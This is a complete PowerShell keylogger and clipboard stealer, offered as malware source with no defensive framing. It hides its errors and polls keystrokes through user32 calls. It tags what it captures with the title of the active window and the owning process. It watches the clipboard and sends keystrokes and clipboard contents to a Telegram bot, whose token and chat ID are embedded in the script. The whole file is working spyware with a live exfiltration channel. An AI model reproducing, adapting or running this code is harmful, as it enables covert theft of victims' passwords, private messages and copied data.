# Run silently
$ErrorActionPreference = 'SilentlyContinue'

# Telegram settings
$TELEGRAM_TOKEN = '8227842274:AAFoKXSWvyxauiDB3WJdCyJgVkbNQfX2wRw'
$CHAT_ID = '8433326167'
$CHUNK_SIZE = 200
$BASE_URL = 'https://api.telegram.org/bot'

# Buffers and state
$keyBuffer = ''
$lastClipboard = ''
$KeyWasDown = @{}
for ($i = 0; $i -lt 256; $i++) { $KeyWasDown[$i] = $false }
$lastSend = [DateTime]::Now
$lastWindow = ''
$keyboardState = New-Object byte[] 256

# Key mapping for special keys
$keyMap = @{
    8 = '[BACKSPACE]'; 9 = '[TAB]'; 13 = '[ENTER]`n'; 16 = '[SHIFT]'; 17 = '[CTRL]'; 18 = '[ALT]';
    19 = '[PAUSE]'; 20 = '[CAPSLOCK]'; 27 = '[ESC]'; 32 = ' '; 33 = '[PAGEUP]'; 34 = '[PAGEDOWN]';
    35 = '[END]'; 36 = '[HOME]'; 37 = '[LEFT]'; 38 = '[UP]'; 39 = '[RIGHT]'; 40 = '[DOWN]';
    44 = '[PRINTSCREEN]'; 45 = '[INSERT]'; 46 = '[DELETE]'; 91 = '[LWIN]'; 92 = '[RWIN]'; 93 = '[MENU]';
    112 = '[F1]'; 113 = '[F2]'; 114 = '[F3]'; 115 = '[F4]'; 116 = '[F5]'; 117 = '[F6]';
    118 = '[F7]'; 119 = '[F8]'; 120 = '[F9]'; 121 = '[F10]'; 122 = '[F11]'; 123 = '[F12]';
    144 = '[NUMLOCK]'; 145 = '[SCROLLLOCK]'; 186 = ';'; 187 = '='; 188 = ','; 189 = '-';
    190 = '.'; 191 = '/'; 192 = '`'; 219 = '['; 220 = '\'; 221 = ']'; 222 = "'"
}

# Fallback key mapping for alphanumeric and punctuation
$fallbackMap = @{
    48 = '0'; 49 = '1'; 50 = '2'; 51 = '3'; 52 = '4'; 53 = '5'; 54 = '6'; 55 = '7'; 56 = '8'; 57 = '9';
    65 = 'a'; 66 = 'b'; 67 = 'c'; 68 = 'd'; 69 = 'e'; 70 = 'f'; 71 = 'g'; 72 = 'h'; 73 = 'i'; 74 = 'j';
    75 = 'k'; 76 = 'l'; 77 = 'm'; 78 = 'n'; 79 = 'o'; 80 = 'p'; 81 = 'q'; 82 = 'r'; 83 = 's'; 84 = 't';
    85 = 'u'; 86 = 'v'; 87 = 'w'; 88 = 'x'; 89 = 'y'; 90 = 'z'; 186 = ';'; 187 = '='; 188 = ','; 189 = '-';
    190 = '.'; 191 = '/'; 192 = '`'; 219 = '['; 220 = '\'; 221 = ']'; 222 = "'"
}
$shiftMap = @{
    '0' = ')'; '1' = '!'; '2' = '@'; '3' = '#'; '4' = '$'; '5' = '%'; '6' = '^'; '7' = '&'; '8' = '*'; '9' = '(';
    '-' = '_'; '=' = '+'; '[' = '{'; ']' = '}'; ';' = ':'; "'" = '"'; ',' = '<'; '.' = '>'; '/' = '?'; '`' = '~'; '\' = '|'
}

# Import User32 for keylogging and window tracking
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll")]
    public static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
        [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
}
"@

# Function to get active window
function Get-ActiveWindow {
    $sb = New-Object Text.StringBuilder 256
    $hwnd = [User32]::GetForegroundWindow()
    $len = [User32]::GetWindowText($hwnd, $sb, 256)
    $title = $sb.ToString()
    try {
        $procHandle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $hwnd }) | Select-Object -First 1
        $procName = if ($procHandle) { $procHandle.ProcessName } else { 'unknown' }
    } catch {
        $procName = 'unknown'
    }
    if ($title -eq '') {
        return "[$procName]"
    } else {
        return "$title | $procName"
    }
}

# Function to get key character
function Get-KeyChar {
    param([int]$vKey)
    try {
        [User32]::GetKeyboardState($keyboardState) | Out-Null
        $scanCode = [User32]::MapVirtualKey($vKey, 0)
        $sb = New-Object System.Text.StringBuilder 2
        $result = [User32]::ToUnicode($vKey, $scanCode, $keyboardState, $sb, $sb.Capacity, 0)
        if ($result -gt 0) {
            return $sb.ToString()
        }
    } catch {}

    # Fallback for alphanumeric and punctuation
    if ($fallbackMap.ContainsKey($vKey)) {
        $char = $fallbackMap[$vKey]
        $shiftPressed = [User32]::GetAsyncKeyState(16) -band 0x8000
        $capsLock = [User32]::GetAsyncKeyState(20) -band 0x0001
        if ($shiftPressed -xor $capsLock) {
            $char = if ($shiftMap.ContainsKey($char)) { $shiftMap[$char] } else { $char.ToUpper() }
        }
        return $char
    }
    return $null
}

# Function to send data to Telegram
function Send-ToTelegram($message, $type) {
    if (-not $message) { return }
    $url = "$BASE_URL$TELEGRAM_TOKEN/sendMessage?chat_id=$CHAT_ID&text=[$type] $message"
    try {
        Invoke-WebRequest -Uri $url -Method POST -UseBasicParsing | Out-Null
    } catch {
        Start-Sleep -Seconds 5
        try { Invoke-WebRequest -Uri $url -Method POST -UseBasicParsing | Out-Null } catch {}
    }
}

# Main loop
while ($true) {
    # Check active window
    $currentWindow = Get-ActiveWindow
    if ($currentWindow -ne $lastWindow -and $keyBuffer) {
        Send-ToTelegram "Window: $lastWindow`nKeys: $keyBuffer" 'Keylog'
        $keyBuffer = ''
        $lastSend = [DateTime]::Now
    }
    $lastWindow = $currentWindow

    # Check for keystrokes (using provided logic)
    for ($vKey = 8; $vKey -lt 256; $vKey++) {
        $keyState = [User32]::GetAsyncKeyState($vKey)
        $isDown = ($keyState -band 0x8000) -ne 0

        if ($isDown -and -not $KeyWasDown[$vKey]) {
            if ($vKey -eq 27) { exit } # ESC to exit (for testing)
            if ($keyMap.ContainsKey($vKey)) {
                $keyBuffer += $keyMap[$vKey]
            } else {
                $char = Get-KeyChar $vKey
                if ($char) {
                    $keyBuffer += $char
                }
            }
        }
        $KeyWasDown[$vKey] = $isDown
    }

    # Check clipboard
    try {
        $clip = Get-Clipboard
        if ($clip -and $clip -ne $lastClipboard -and $clip.Trim()) {
            if ($keyBuffer) {
                Send-ToTelegram "Window: $lastWindow`nKeys: $keyBuffer" 'Keylog'
                $keyBuffer = ''
                $lastSend = [DateTime]::Now
            }
            Send-ToTelegram "Window: $currentWindow`nData: $clip" 'Clipboard'
            $lastClipboard = $clip
        }
    } catch {}

    # Send key buffer if full or after 5 minutes
    if ($keyBuffer.Length -ge $CHUNK_SIZE -or ($keyBuffer -and ([DateTime]::Now - $lastSend).TotalMinutes -ge 5)) {
        Send-ToTelegram "Window: $lastWindow`nKeys: $keyBuffer" 'Keylog'
        $keyBuffer = ''
        $lastSend = [DateTime]::Now
    }

    # Sleep for responsiveness and efficiency
    Start-Sleep -Milliseconds 40
}